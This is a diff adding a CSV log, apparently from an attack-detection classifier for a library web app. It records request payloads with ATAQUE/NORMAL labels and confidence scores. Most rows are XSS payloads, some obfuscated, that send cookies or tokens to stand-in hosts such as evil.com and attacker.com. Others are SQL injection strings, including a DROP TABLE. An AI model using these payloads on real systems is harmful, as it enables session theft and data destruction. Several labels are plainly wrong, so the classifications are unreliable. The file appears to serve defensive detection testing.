@@ -1,0 +1,62 @@
+﻿Data/Hora,IP,Payload,Classificacao,Confianca,Suspeita
+2026-05-11T16:00:02.122-03:00,10.0.0.5,"{""nome"":""<img src=x onerror='fetch(\""http://evil.io/\""+btoa(document.cookie))'>""}",NORMAL,58.0%,-
+2026-05-11T16:00:04.988-03:00,189.55.1.4,"{""comment"":""<svg/onload='document.location=\""http://attacker.com/steal?token=\""+localStorage.getItem(\""token\"")'>""}",ATAQUE,71.1%,1
+2026-05-11T16:00:06.222-03:00,10.0.0.8,"{""payload"":""<script>navigator.sendBeacon(\""http://malware.org/log\"",document.cookie)</script>""}",ATAQUE,71.1%,1
+2026-05-11T16:00:08.444-03:00,187.1.55.99,"{""nome"":""<details open ontoggle=eval(atob('ZmV0Y2goImh0dHA6Ly9hdHRhY2tlci5jb20vIitkb2N1bWVudC5jb29raWUp'))>""}",ATAQUE,66.2%,1
+2026-05-11T16:00:10.666-03:00,10.0.0.12,"{""msg"":""<body/onpageshow=fetch('http://phish.me/'+document.cookie)>""}",ATAQUE,71.1%,1
+2026-05-11T16:00:12.888-03:00,189.10.20.30,"{""xss"":""<audio src/onerror='new(Image).src=\""http://evil.com/\""+document.cookie'>""}",ATAQUE,57.9%,1
+2026-05-11T16:00:14.111-03:00,177.88.99.1,"{""nome"":""<input onfocus=window.location='http://attacker.com/' autofocus>""}",ATAQUE,71.1%,1
+2026-05-11T16:00:16.333-03:00,10.0.0.5,"{""nome"":""<video><source onerror=\""eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,101,118,105,108,46,99,111,109,39,41))\""></video>""}",ATAQUE,85.1%,1
+2026-05-11T16:00:18.555-03:00,189.33.22.11,"{""payload"":""<marquee onstart='fetch(\""http://attacker.com/\""+document.cookie)'>""}",ATAQUE,71.1%,1
+2026-05-11T16:00:20.777-03:00,10.0.0.10,"{""nome"":""<table background='javascript:fetch(\""http://evil.com\"")'></table>""}",ATAQUE,71.1%,1
+2026-05-11T16:00:22.999-03:00,192.168.0.5,"{""nome"":""<link rel='import' href='http://evil.com/xss.html'>""}",ATAQUE,71.1%,1
+2026-05-11T16:00:24.222-03:00,189.99.88.77,"{""xss"":""<a href='javascript:void(fetch(\""http://attacker.com/\""+document.cookie))'>Click</a>""}",ATAQUE,71.1%,1
+2026-05-11T16:00:26.444-03:00,10.0.0.8,"{""css"":""<style>@import 'http://evil.com/xss.css';</style>""}",ATAQUE,71.1%,1
+2026-05-11T16:00:28.666-03:00,189.1.1.1,"{""nome"":""<object data='javascript:fetch(\""http://evil.com\"")'></object>""}",ATAQUE,71.1%,1
+2026-05-11T16:00:30.888-03:00,10.0.0.20,"{""nome"":""<embed src='javascript:console.log(document.cookie)'></embed>""}",ATAQUE,57.9%,1
+2026-05-11T16:00:32.111-03:00,10.0.0.3,"{""comment"":""<form id='x' /><button form='x' formaction='javascript:fetch(\""//attacker.com\"")'>Post</button>""}",ATAQUE,71.1%,1
+2026-05-11T16:00:34.333-03:00,189.2.2.2,"{""nome"":""<isindex formaction='javascript:fetch(\""http://evil.com\"")' type='submit'>""}",ATAQUE,71.1%,1
+2026-05-11T16:00:36.555-03:00,192.168.1.25,"{""nome"":""<keygen onfocus='window.location=\""http://attacker.com/\""'>""}",ATAQUE,71.1%,1
+2026-05-11T16:00:38.777-03:00,10.0.0.8,"{""payload"":""<frameset onload='(new Image()).src=\""http://attacker.com/log?\""+document.cookie'>""}",ATAQUE,57.9%,1
+2026-05-11T16:00:40.999-03:00,189.5.5.5,"{""nome"":""<svg><animatetransform onbegin=fetch('http://evil.com/'+document.cookie)>""}",ATAQUE,71.1%,1
+2026-05-11T16:00:42.222-03:00,10.0.0.5,"{""nome"":""<script/src='//attacker.com/x.js'></script>""}",ATAQUE,57.9%,1
+2026-05-11T16:00:44.444-03:00,189.55.1.4,"{""msg"":""<details/ontoggle='(new(Image)).src=\""//evil.com/\""+document.cookie'>""}",ATAQUE,57.9%,1
+2026-05-11T16:00:46.666-03:00,10.0.0.8,"{""xss"":""<img src=x:one onerror=eval(atob('ZmV0Y2goImh0dHA6Ly9hdHRhY2tlci5jb20iK2RvY3VtZW50LmNvb2tpZSk='))>""}",NORMAL,62.4%,-
+2026-05-11T16:00:48.888-03:00,187.1.55.99,"{""nome"":""<math><mtext><option><fake><script>fetch(\""//evil.com\"")</script>""}",ATAQUE,71.1%,1
+2026-05-11T16:00:50.111-03:00,10.0.0.12,"{""payload"":""<base href='javascript:fetch(\""//evil.com\"")//'>""}",ATAQUE,71.1%,1
+2026-05-11T16:00:52.333-03:00,189.10.20.30,"{""msg"":""<button/onmouseover=navigator.sendBeacon('//evil.io',document.cookie)>""}",ATAQUE,71.1%,1
+2026-05-11T16:00:54.555-03:00,177.88.99.1,"{""nome"":""<form><button formaction='javascript:fetch(\""//evil.com\"")'>Click</button></form>""}",ATAQUE,71.1%,1
+2026-05-11T16:00:56.777-03:00,10.0.0.5,"{""nome"":""<iframe/src=\""javascript:fetch('//evil.com/'+document.cookie)\"">""}",ATAQUE,57.9%,1
+2026-05-11T16:00:58.999-03:00,189.33.22.11,"{""payload"":""<svg/onmouseover='(new(Image)).src=\""//attacker.com/\""+localStorage.token'>""}",ATAQUE,57.9%,1
+2026-05-11T16:01:01.222-03:00,10.0.0.10,"{""nome"":""<marquee/onfinish=fetch('//evil.com/'+document.cookie)>""}",ATAQUE,71.1%,1
+2026-05-11T16:01:03.444-03:00,192.168.0.5,"{""nome"":""<audio/src/onplaying='fetch(\""//evil.com/\""+document.cookie)'>""}",ATAQUE,71.1%,1
+2026-05-11T16:01:05.666-03:00,189.99.88.77,"{""xss"":""<textarea/onfocus=eval(atob('ZmV0Y2goIi8vYXR0YWNrZXIuY29tLyIrZG9CdW1lbnQuY29va2llKQ=='))>""}",ATAQUE,66.2%,1
+2026-05-11T16:01:07.888-03:00,10.0.0.8,"{""css"":""<link/rel='stylesheet'/href='javascript:fetch(\""//evil.com\"")'>""}",ATAQUE,71.1%,1
+2026-05-11T16:01:10.111-03:00,189.1.1.1,"{""nome"":""<table/background='javascript:navigator.sendBeacon(\""//evil.io\"")'>""}",ATAQUE,71.1%,1
+2026-05-11T16:01:12.333-03:00,10.0.0.20,"{""nome"":""<body/onresize=fetch('//evil.com/'+document.cookie)>""}",ATAQUE,71.1%,1
+2026-05-11T16:01:14.555-03:00,10.0.0.3,"{""comment"":""<form/action='javascript:fetch(\""//evil.com\"")'><input/type='submit'>""}",ATAQUE,71.1%,1
+2026-05-11T16:01:16.777-03:00,189.2.2.2,"{""nome"":""<img/src=1/onmouseover=eval(String.fromCharCode(102,101,116,99,104,40,39,47,47,101,118,105,108,46,99,111,109,39,41))>""}",ATAQUE,54.9%,1
+2026-05-11T16:01:18.999-03:00,192.168.1.25,"{""nome"":""<details/open/ontoggle=window.location.assign('//attacker.com')>""}",ATAQUE,71.1%,1
+2026-05-11T16:01:21.222-03:00,10.0.0.8,"{""payload"":""<frameset/onload=eval(atob('ZmV0Y2goIi8vYXR0YWNrZXIuY29tLyIrZG9jdW1lbnQuY29va2llKQ=='))>""}",ATAQUE,66.2%,1
+2026-05-11T16:01:23.444-03:00,189.5.5.5,"{""nome"":""<svg/onload=fetch('//evil.com/'+document.cookie)>""}",ATAQUE,71.1%,1
+2026-04-18T16:34:30.409-03:00,192.168.86.28,"{""msg"":""Acesso à raiz do sistema via python-requests""}",ATAQUE,71.1%,1
+2026-04-18T16:34:35.353-03:00,192.168.86.28,"{""msg"":""Acesso à raiz do sistema via python-requests""}",ATAQUE,71.1%,1
+2026-05-05T00:33:16.298-03:00,127.0.0.1,"{""disponibilidade"":""DISPONIVEL"",""contexto"":""/livros""}",ATAQUE,71.1%,1
+2026-05-05T00:33:19.697-03:00,127.0.0.1,"{""usuario"":{""codigoLogin"":39},""livro"":{""codigoLivro"":8},""dataRetirada"":""2026-05-05"",""dataPrevista"":""2026-05-19""}",ATAQUE,71.1%,1
+2026-05-05T00:33:24.649-03:00,127.0.0.1,"{""msg"":""Listagem de usuários""}",ATAQUE,71.1%,1
+2026-05-05T00:33:28.756-03:00,127.0.0.1,"{""usuario"":{""codigoLogin"":1},""livro"":{""codigoLivro"":21},""dataRetirada"":""2026-05-05"",""dataPrevista"":""2026-05-19""}",ATAQUE,71.1%,1
+2026-05-05T00:33:32.880-03:00,127.0.0.1,"{""msg"":""Consulta de empréstimos ativos""}",ATAQUE,71.1%,1
+2026-05-05T00:33:39.746-03:00,127.0.0.1,"{""dataDeEntrega"":""2026-05-05"",""emprestimo_id"":71}",ATAQUE,71.1%,1
+2026-05-05T00:33:43.561-03:00,127.0.0.1,"{""dataDeEntrega"":""2026-05-05"",""emprestimo_id"":72}",ATAQUE,71.1%,1
+2026-05-05T00:33:56.514-03:00,127.0.0.1,"{""nome"":""Thomaz Augusto"",""email"":""thomas@gmail.com"",""telefone"":""31214512432"",""dataDeNascimento"":""1997-05-05"",""perfil"":""USUARIO""}",ATAQUE,71.1%,1
+2026-05-05T00:34:04.856-03:00,127.0.0.1,"{""nome"":""Thiago"",""email"":""thiago@email.com.br"",""telefone"":""555555555555"",""perfil"":""BIBLIOTECARIO""}",ATAQUE,71.1%,1
+2026-05-05T00:34:29.623-03:00,127.0.0.1,"{""nome"":""Coração em Chamas"",""autor"":""Helena Moura"",""disponibilidade"":""INDISPONIVEL""}",ATAQUE,71.1%,1
+2026-04-30T17:54:18.965-03:00,127.0.0.1,"{""email"":""email@usuario.com"",""password"":""' OR '1'='1""}",ATAQUE,59.3%,1
+2026-04-30T17:54:28.316-03:00,127.0.0.1,"{""email"":""email@usuario.com"",""password"":""' OR 1=1 --""}",ATAQUE,58.5%,1
+2026-04-30T17:54:37.997-03:00,127.0.0.1,"{""email"":""email@usuario.com"",""password"":""'; DROP TABLE usuarios; --""}",ATAQUE,89.0%,1
+2026-04-30T17:58:11.084-03:00,127.0.0.1,"{""nome"":""' UNION SELECT null, nome FROM livros --"",""autor"":""3"",""genero"":{""id"":3}}",ATAQUE,89.0%,1
+2026-05-03T23:46:00.173-03:00,127.0.0.1,"{""email"":""nicolasjdc55@gmail.com"",""password"":""SELECT * FROM usuario WHERE email = 'INPUT' AND senha = 'INPUT';""}",NORMAL,74.5%,-
+2026-05-03T23:49:48.943-03:00,127.0.0.1,"{""email"":""nicolasjdc55@gmail.com"",""password"":""SELECT * FROM usuario WHERE email = '' OR '1'='1 teste@email.com' OR '1'='1 admin' --' AND senha = 'qualquer ' OR 1=1 --'""}",ATAQUE,50.0%,SENSÍVEL (Heurística)
+2026-05-03T23:55:23.561-03:00,127.0.0.1,"{""nome"":""Harry Potter' OR 'a'='a"",""autor"":""teste"",""genero"":{""id"":2}}",ATAQUE,59.3%,1
+2026-05-03T23:55:41.600-03:00,127.0.0.1,"{""nome"":""'Comedia' OR 'a'='a""}",ATAQUE,59.3%,1
+2026-05-04T00:05:12.418-03:00,127.0.0.1,"{""nome"":""teste@email.com' OR '1'='1"",""email"":""adonias@gmail.com"",""telefone"":""34234234123"",""dataDeNascimento"":""2004-01-21"",""perfil"":""USUARIO""}",ATAQUE,59.3%,1
